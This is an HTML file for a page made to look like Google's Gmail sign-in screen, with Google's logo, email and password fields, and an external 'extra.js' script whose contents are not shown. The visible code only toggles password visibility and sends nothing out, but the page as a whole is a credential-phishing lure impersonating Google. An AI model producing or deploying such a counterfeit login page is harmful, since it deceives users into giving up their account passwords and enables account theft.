<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sign in â€“ Google</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <script src="extra.js" defer></script> <!-- Link to the external extra.js -->
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background-color: #f2f2f2;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: white;
      width: 400px;
      padding: 40px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
      border-radius: 8px;
      text-align: center;
    }
    .logo {
      width: 75px;
      margin-bottom: 20px;
    }
    h1 {
      font-weight: 400;
      font-size: 24px;
      margin-bottom: 10px;
    }
    p {
      color: #5f6368;
      font-size: 14px;
      margin-bottom: 30px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 10px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
    }
    .password-wrapper {
      position: relative;
      width: 100%;
    }
    .toggle-password {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      font-size: 14px;
      color: #1a73e8;
    }
    .next-button {
      background-color: #1a73e8;
      color: white;
      border: none;
      padding: 12px 24px;
      font-size: 16px;
      border-radius: 4px;
      cursor: pointer;
      width: 100%;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img class="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google">
    <h1>Sign in</h1>
    <p>to continue to Gmail</p>
    <form id="demoForm">
      <input type="email" id="emailInput" placeholder="Email or phone" required />
      <div class="password-wrapper">
        <input type="password" id="passwordInput" placeholder="Enter your password" required />
        <button class="toggle-password" onclick="togglePassword()">Show</button>
      </div>
      <button type="submit" class="next-button">Next</button>
    </form>
  </div>

  <script>
    function togglePassword() {
      const passwordField = document.getElementById("passwordInput");
      const toggleButton = document.querySelector(".toggle-password");
      if (passwordField.type === "password") {
        passwordField.type = "text";
        toggleButton.textContent = "Hide";
      } else {
        passwordField.type = "password";
        toggleButton.textContent = "Show";
      }
    }
  </script>
</body>
</html>
